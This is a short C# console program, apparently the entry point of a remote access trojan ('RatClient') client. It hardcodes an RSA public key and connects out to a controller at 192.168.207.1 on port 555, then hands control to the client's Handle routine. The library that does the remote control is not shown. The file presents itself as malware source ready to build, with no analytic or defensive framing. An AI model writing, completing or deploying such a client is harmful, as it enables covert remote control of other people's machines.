using System.Numerics;



namespace ConsoleApp43
{
    class Program
    {
        public static void Main(string[] args)
        {
            BigInteger n = BigInteger.Parse("130207301034004661455027913688923327146343398866625243908655292016961311687455936189602612639881746041437642117397999433889984747790829683399942449818446067929003127144782759564471484412125307160062468145732861525984991405836950669766085891756502788398772584383449300023796025235227753602387780436256335801097");
            BigInteger e = BigInteger.Parse("65537");
            BigInteger[] publicKey = new BigInteger[] { e, n };
            var client = new RatClient.Client("192.168.207.1", 555, publicKey);
            client.Handle();
        }
    }
}
